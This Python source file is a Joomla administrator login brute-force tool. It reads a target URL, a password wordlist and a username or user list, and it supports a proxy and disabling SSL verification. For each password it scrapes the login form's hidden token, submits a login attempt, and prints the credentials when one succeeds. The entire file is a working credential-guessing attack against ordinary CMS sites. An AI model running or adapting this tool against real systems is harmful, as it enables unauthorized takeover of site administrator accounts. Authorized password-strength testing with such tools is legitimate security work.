#!/usr/bin/python3

# Import required modules
import requests  # Used for HTTP requests
from bs4 import BeautifulSoup  # Used for HTML parsing
import argparse  # Used for command-line argument parsing
from urllib.parse import urlparse  # Used for URL parsing
import sys  # Import sys to use sys.stdout.flush()

# Define class for terminal color codes
class bcolors:
    HEADER = '\033[95m'
    OKRED = '\033[91m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# Define main class for Joomla brute force attack
class Joomla():

    # Initialize the class and call necessary functions
    def __init__(self):
        self.initializeVariables()  # Initialize variables based on command-line arguments
        self.sendrequest()  # Start the brute force attack

    # Initialize variables from command-line arguments
    def initializeVariables(self):
        # Set up argument parser with program description
        parser = argparse.ArgumentParser(description='Joomla login bruteforce tool with proxy support and optional SSL verification disabling.')
        # Define required and optional arguments
        parser.add_argument('-u', '--url', required=True, type=str, help='Joomla site URL')
        parser.add_argument('-w', '--wordlist', required=True, type=str, help='Path to wordlist file')
        parser.add_argument('-p', '--proxy', type=str, help='Specify proxy (e.g., http://127.0.0.1:8080). Optional.')
        parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output showing failed attempts.')
        parser.add_argument('-k', '--insecure', action='store_true', help='Disable SSL certificate verification. Use with caution, especially with proxies.')

        # Define mutually exclusive group for username input
        group = parser.add_mutually_exclusive_group(required=True)
        group.add_argument('-usr', '--username', type=str, help='Single username to attempt')
        group.add_argument('-U', '--userlist', type=str, help='Path to file containing list of usernames')

        # Parse arguments
        args = parser.parse_args()

        # Set proxy if specified
        self.proxies = None
        if args.proxy:
            self.proxies = {'http': args.proxy, 'https': args.proxy}

        # Set other variables from arguments
        self.verbose = args.verbose
        self.verify_ssl = not args.insecure
        self.url = args.url + '/administrator/'
        self.cookies = requests.session().get(self.url, proxies=self.proxies, verify=self.verify_ssl).cookies.get_dict()
        self.wordlistfile = args.wordlist
        self.username = args.username
        self.userlist = args.userlist

    # Start the brute force attack
    def sendrequest(self):
        # If a userlist is specified, iterate through users
        if self.userlist:
            for user in self.getdata(self.userlist):
                self.username = user.decode('utf-8')
                self.doGET()  # Attempt to login for each user
        else:
            self.doGET()  # Attempt to login with a single username

    # Attempt login with the given username and passwords from wordlist
    def doGET(self):
        passwords = self.getdata(self.wordlistfile)  # Read passwords from wordlist
        total_passwords = len(passwords)  # Count total passwords for progress tracking
        current_password_index = 1  # Initialize password index

        # Iterate through passwords
        for password in passwords:
            # Print progress message
            sys.stdout.write(f'\r{bcolors.OKBLUE}Trying password {bcolors.OKGREEN}{current_password_index}{bcolors.ENDC}{bcolors.OKBLUE} of {total_passwords}: {bcolors.OKRED}{password.decode("utf-8")}{bcolors.ENDC}\033[K')
            sys.stdout.flush()

            # Set request headers
            headers = {'User-Agent': 'nano'}
            # Make a GET request to fetch login form tokens
            r = requests.get(self.url, proxies=self.proxies, cookies=self.cookies, headers=headers, verify=self.verify_ssl)

            # Parse the response to find the login form token
            soup = BeautifulSoup(r.text, 'html.parser')
            longstring = (soup.find_all('input', type='hidden')[-1]).get('name')
            password = password.decode('utf-8')

            # Prepare POST data for login attempt
            data = {
                'username': self.username,
                'passwd': password,
                'option': 'com_login',
                'task': 'login',
                'return': 'aW5kZXgucGhw',
                longstring: 1
            }

            # Make a POST request to attempt login
            r = requests.post(self.url, data=data, proxies=self.proxies, cookies=self.cookies, headers=headers, verify=self.verify_ssl)
            soup = BeautifulSoup(r.text, 'html.parser')
            # Check login response for failure or success
            response = soup.find('div', {'class': 'alert-message'})

            # Print verbose output if login failed
            if response and self.verbose:
                print(f'\n [-]{bcolors.FAIL}Failed: {self.username}:{password}{bcolors.ENDC}')
            elif not response:  # If login is successful, print the credentials
                print(f'\n\n{bcolors.OKGREEN}[+] Password Found: \n\nUsername:{bcolors.ENDC}{self.username}{bcolors.OKGREEN}\nPassword:{bcolors.ENDC}{password}{bcolors.ENDC}')
                break  # Exit the loop on success

            current_password_index += 1  # Increment password index

    # Static method to read data from a file and return as a list
    @staticmethod
    def getdata(path):
        with open(path, 'rb+') as f:
            data = [line.rstrip() for line in f]
        return data

# Instantiate the Joomla class to start the brute force attack
joomla = Joomla()
